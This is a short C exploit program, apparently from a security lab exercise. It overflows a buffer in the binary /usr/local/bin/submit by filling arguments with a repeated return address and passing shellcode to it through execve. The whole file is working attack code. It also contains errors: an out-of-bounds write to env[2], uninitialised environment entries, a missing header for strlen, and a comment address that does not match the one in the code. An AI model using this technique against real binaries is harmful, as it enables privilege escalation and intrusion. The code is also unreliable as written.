/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include </share/shellcode.h>

#define TARGET "/usr/local/bin/submit"
#define DEFAULT_BUFFER_SIZE            180

int main(void)
{
  char *args[4], *ptr;
  char *env[2];
  char buff[DEFAULT_BUFFER_SIZE];
  long *addr_ptr;
  long *addr = (long*) 0xbfdf91ff;   // Shellcode is stored at 0xffbfdf94 from submit:main()
  const int slen = strlen(shellcode);
  int i;

  printf("Using address: 0x%x\n", addr);
  addr_ptr = (long *) buff;

  //Fill buff with address
  //Addition addrs to overflow buffer
  for (i = 0; i < DEFAULT_BUFFER_SIZE; i+=4)
    *(addr_ptr++) = (long) addr;


  args[0] = buff;
  args[1] = "--help";
  args[2] = shellcode;
  args[3] = NULL;


  //environment vars
  // env[1] = buf;
  env[2] =  NULL;

  //Run submit
  return execve("/usr/local/bin/submit", args, env);
}





